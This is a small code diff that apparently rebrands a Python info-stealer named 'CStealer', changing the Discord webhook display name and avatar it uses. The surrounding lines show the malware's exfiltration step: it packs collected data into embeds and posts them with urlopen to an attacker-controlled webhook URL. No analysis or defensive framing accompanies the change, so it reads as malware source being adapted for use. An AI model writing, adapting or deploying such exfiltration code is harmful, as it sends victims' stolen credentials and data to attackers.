@@ -181,8 +181,8 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "CStealer",
-        "avatar_url": "https://i.hizliresim.com/9ftjid9.jpg"
+        "username": "Gr1mhhcch",
+        "avatar_url": "https://media.discordapp.net/attachments/897528907341893643/902666549402411049/original.png?width=606&height=402"
     }
     try:
         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getheaders()))
